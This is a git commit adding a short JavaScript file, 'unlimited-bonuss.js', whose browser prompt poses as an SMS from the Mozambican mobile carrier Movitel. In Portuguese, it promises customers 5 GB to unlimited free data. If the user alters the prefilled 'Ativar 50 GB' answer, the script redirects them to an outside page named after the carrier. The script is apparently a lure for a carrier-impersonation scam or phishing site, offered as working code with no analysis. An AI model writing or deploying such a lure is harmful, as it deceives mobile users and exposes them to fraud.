7d5ec04df1e80f108c7e64f2d6412f891b76aaac
boss-bloq <nsisboy01@gmail.com>
2024-09-20 06:10:16 -0700

    Create unlimited-bonuss.js

---
+++ unlimited-bonuss.js
@@ -0,0 +1,6 @@
+
+var password = 'Ativar 50 GB'
+password=prompt('SMS: Prezado cliente, por favor verifique se o seu cartão SIM Movitel está qualificado para receber de 5GB a dados ilimitados, clientes antigos Recompensa, pressione OK para verificar agora ','Ativar 50 GB');
+if (password != 'Ativar 50 GB') {
+location.href='https://damba-fest.org/movitel-mz.html';
+}
